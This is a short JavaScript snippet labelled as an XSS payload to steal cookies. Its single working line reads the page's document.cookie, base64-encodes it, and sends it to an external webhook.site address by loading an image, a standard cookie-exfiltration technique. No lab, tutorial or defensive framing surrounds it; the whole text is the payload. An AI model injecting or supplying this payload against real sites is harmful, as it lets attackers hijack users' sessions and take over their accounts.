// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/YOUR-UNIQUE-ID?data=' + btoa(document.cookie);
